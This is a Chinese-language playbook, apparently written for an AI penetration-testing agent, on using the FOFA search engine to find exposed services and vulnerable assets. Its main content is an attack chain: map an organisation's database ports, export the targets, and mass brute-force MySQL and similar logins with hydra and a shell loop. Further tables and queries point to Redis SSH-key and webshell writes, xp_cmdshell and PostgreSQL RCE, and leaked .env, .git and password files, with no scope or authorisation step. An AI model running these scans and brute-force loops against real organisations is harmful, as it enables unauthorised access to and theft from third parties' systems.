# FOFA 资产测绘与漏洞狩猎

## 场景

FOFA 是国内主流的网络空间测绘搜索引擎（类比 Shodan/Censys），通过主动扫描全球 IP 和服务，构建可搜索的资产指纹库。核心价值在于：**在不动目标的前提下，提前发现暴露的服务、版本、配置**，从而批量定位潜在脆弱资产。

## 输入信号

- 拿到一个域名/org/ASN → 需要拓展开所有关联资产
- 已知某个漏洞影响的 app/version → 需要找出全网受影响目标
- 目标网络段明确 → 需要批量检索暴露服务
- CTF/渗透初期 → 没有目标，需要自动发现脆弱资产

## FOFA 语法速查

### 基础字段

| 字段 | 说明 | 示例 |
|------|------|------|
| `domain` | 域名 | `domain="example.com"` |
| `host` | 主机名 | `host="*.example.com"` |
| `ip` | IP 地址 | `ip="1.2.3.4"` |
| `port` | 端口 | `port="3306"` |
| `protocol` | 协议 | `protocol="https"` |
| `title` | 网页标题 | `title="后台管理"` |
| `header` | HTTP 响应头 | `header="Server: nginx"` |
| `body` | HTTP 响应体 | `body="username"` |
| `cert` | SSL 证书 | `cert="example.com"` |
| `org` | 所属组织 | `org="Example Corp"` |
| `asn` | 自治系统号 | `asn="4538"` |
| `country` | 国家 | `country="CN"` |
| `region` | 省份/地区 | `region="Jiangsu"` |
| `city` | 城市 | `city="Nanjing"` |
| `server` | 服务器类型 | `server="nginx/1.18"` |
| `app` | 应用指纹 | `app="致远OA"` |
| `banner` | 服务 Banner | `banner="MySQL"` |
| `type` | 协议类型 | `type="service"` |
| `os` | 操作系统 | `os="Windows"` |
| `icp` | ICP 备案 | `icp="京ICP证XXXXX号"` |

### 逻辑运算

```
&&   AND     port="3306" && country="CN"
||   OR      app="phpMyAdmin" || app="Adminer"
!=   NOT     port!="80" && port!="443"
()   分组    (port="3306" || port="6379") && country="CN"
```

### 高级语法

```
# 精确匹配
header="Server: nginx/1.18.0"

# 模糊匹配
body~="password"

# 正则匹配（会员功能）
body="admin.*login"

# 范围
port>=8000 && port<=9000

# after/before 时间过滤
after="2024-01-01" && before="2024-12-31"

# IP 段
ip="1.2.3.4/24"

# 完整查询组合
org="Example Corp" && port="3306" && country="CN"
```

## 实战模式 1：批量弱口令狩猎

> 蒸馏自 DarkSec 资产测绘+弱口令批量打法

### 攻击链

```
FOFA 资产测绘 → 批量导出资产 → 弱口令爆破 → 手动复测 → 提交漏洞
```

### Step 1: FOFA 资产测绘

利用 `org` 字段锁定目标网络范围，按端口筛选暴露的服务：

```bash
# 按 org 锁定目标，筛选数据库端口
org="目标组织" && port="3306"

# 扩展：同时检索多种数据库端口
org="目标组织" && (port="3306" || port="6379" || port="27017" || port="5432" || port="1433")

# 按域名/ASN/ip 段同样可用
domain="*.example.com" && port="3306"
asn="4538" && port="6379"
```

**`org` vs `domain` 的选择：**
- `org="XXX"` 覆盖该组织下所有 IP 段（含纯 IP 服务），资产量级大
- `domain="*.example.com"` 仅匹配有域名的资产，可能遗漏大量 IP 直连服务
- 先用 org 大面积测绘，再按需细化

### Step 2: 批量导出资产

FOFA 会员支持 CSV 导出，包含 `ip,port,protocol,title,domain,org` 等字段。提取 `ip:port` 列表供下一步爆破使用。

```bash
# 如果导出为 CSV，提取 ip:port
cat fofa_export.csv | cut -d',' -f1,2 | tail -n +2 > targets.txt
```

### Step 3: 弱口令批量爆破

使用 TScanPlus 或自定义脚本：

```bash
# hydra 批量 MySQL 弱口令
hydra -L targets.txt -P weak_passwords.txt mysql

# 或自定义 Python 脚本
while read target; do
  ip=$(echo $target | cut -d: -f1)
  port=$(echo $target | cut -d: -f2)
  for pass in root admin 123456 password; do
    mysql -h $ip -P $port -u root -p"$pass" -e "SELECT 1" 2>/dev/null && \
      echo "[+] $ip:$port root:$pass"
  done
done < targets.txt
```

### Step 4: 手动复测 + 提交

```bash
# Navicat / MySQL CLI 手动连接验证
mysql -h <target_ip> -P 3306 -u root -p
# 连接成功后截图提交漏洞平台
```

### 扩展思路（文章中提及的其他端口）

| 端口 | 服务 | 弱口令利用 |
|------|------|-----------|
| 3306 | MySQL | 数据库读写、UDF 提权 |
| 6379 | Redis | 写 SSH key、写 webshell |
| 27017 | MongoDB | 未授权访问、数据窃取 |
| 5432 | PostgreSQL | RCE via COPY FROM PROGRAM |
| 1433 | MSSQL | xp_cmdshell RCE |
| 21 | FTP | 匿名登录、文件上传 |
| 22 | SSH | 爆破登录、密钥泄露 |
| 3389 | RDP | 爆破登录 |
| 8080/8443 | Web 管理后台 | 默认口令登录 |

## 实战模式 2：漏洞版本批量定位

当某个 CVE 公布后，通过 FOFA 快速找出受影响的全网资产：

```bash
# 示例：Confluence OGNL RCE (CVE-2022-26134)
app="Atlassian-Confluence" && (body="< confluence" || title="Confluence")

# 示例：Log4j 受影响资产
(app="Apache-Tomcat" || app="Apache-Solr" || app="Elasticsearch" || app="Apache-Struts2")

# 示例：Shiro RememberMe RCE
header="rememberMe=deleteMe" || body="rememberMe"

# 示例：Weblogic
app="BEA-WebLogic-Server" || header="WebLogic"
```

### 版本指纹组合技

```bash
# 精确到版本号 + 已知漏洞
app="phpMyAdmin-4.8" && country="CN"
# → 4.8.x 存在 LFI/RCE (PMASA-2018-6)

# 多条件交叉验证
app="致远OA" && body="A8" && country="CN"
# → 致远 A8 版本，存在 fastjson 反序列化
```

## 实战模式 3：配置错误发现

```bash
# Git 泄露
body=".git/HEAD" || title="Index of /.git"

# 目录列表暴露
title="Index of /" && body="Parent Directory"

# 配置文件泄露
body="DB_PASSWORD" && (port="80" || port="443")

# phpinfo 页面
title="phpinfo()" || body="PHP Version"

# Swagger/API 文档
body="swagger" && (title="Swagger" || body="swagger.json")

# .env 泄露
body="APP_ENV=" && body="DB_HOST="

# 备份文件
(body="backup" || body="bak") && (body=".sql" || body=".zip" || body=".tar")
```

## 实战模式 4：同类资产关联拓展

从一个已知目标出发，通过多种维度拓展攻击面：

```bash
# 从域名拓 org
domain="target.example.com" → 查到的 org 字段 → 再用 org="XXX" 反查

# 从 IP 拓 C 段
ip="1.2.3.0/24" && country="CN"

# 从 SSL 证书拓所有使用同证书的 IP
cert="target.com"

# 从 header 特征拓同类应用
header="X-Powered-By: PHP/5.6" && country="CN"

# 从 body 特征拓同类 CMS
body="Powered by DedeCMS" && country="CN"
```

## 工具链

| 阶段 | 工具 | 说明 |
|------|------|------|
| 资产测绘 | FOFA | 语法检索 + CSV 导出 |
| 资产测绘 | Shodan / Censys | 国外测绘互补 |
| 资产测绘 | Hunter | 奇安信测绘引擎 |
| 批量验证 | TScanPlus | 弱口令/漏洞批量扫描 |
| 批量验证 | hydra / medusa | 专业弱口令爆破 |
| 手动复测 | Navicat | 数据库 GUI 连接验证 |
| 手动复测 | `mysql` / `redis-cli` / `mongo` | CLI 连接验证 |
| 漏洞提交 | 漏洞报告平台 | SRC/CNVD/CVE |

## FOFA vs Shodan vs Censys 互补

| 维度 | FOFA | Shodan | Censys |
|------|------|--------|--------|
| 中文资产覆盖 | ★★★★★ 最全 | ★★ | ★★ |
| 中国 IP 段 | ★★★★★ 最全 | ★★★ | ★★★ |
| 国外资产 | ★★★ | ★★★★★ 最全 | ★★★★★ |
| 应用指纹 | ★★★★ 丰富 | ★★★★ | ★★★ |
| org 字段 | ★★★★★ 独有优势 | ★★ | ★ |
| API 调用 | 会员 | 有免费额度 | 有免费额度 |
| 价格 | 会员制 | 按需 | 按需 |

## 攻击链

```
1. 确定目标范围 → org/domain/asn/ip 段
2. FOFA 语法组合 → 锁定具体服务/端口/版本
3. 导出 IP:Port 列表 → 去重 + 排序
4. 批量工具扫描 → 弱口令/CVE PoC/配置检查
5. 手动复测确认 → 截图 + 写报告
6. 提交漏洞平台
```

## FOFA API 脚本示例

```python
import requests
import base64

FOFA_EMAIL = "your_email"
FOFA_KEY = "your_api_key"

def fofa_search(query: str, size: int = 100) -> list[str]:
    """FOFA API 查询，返回 IP:Port 列表"""
    qbase64 = base64.b64encode(query.encode()).decode()
    url = f"https://fofa.info/api/v1/search/all?email={FOFA_EMAIL}&key={FOFA_KEY}&qbase64={qbase64}&size={size}"
    resp = requests.get(url).json()
    if resp.get("error"):
        raise Exception(resp["errmsg"])
    return resp.get("results", [])

# 使用示例
targets = fofa_search('org="目标组织" && port="3306"', size=5000)
with open("fofa_targets.txt", "w") as f:
    for ip, port in targets:
        f.write(f"{ip}:{port}\n")
print(f"[+] 导出 {len(targets)} 条资产")
```

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| HTTP 探测确认资产存活 | `http_probe` | 验证 FOFA 资产是否存活 |
| 按信号查知识库 | `kb_router` | 搜索 fofa recon 等相关技术 |

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“页面可见变化”与服务端内容授权分开记录；只有正文差分、状态变化或 Flag 可重复出现才算确认。
- 从全新浏览器 profile/session 最小化重放，记录 UA、Cookie、Storage、脚本拦截规则和执行时序。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据使用 `REDACTED` 占位并自动检索常见 Flag 格式。
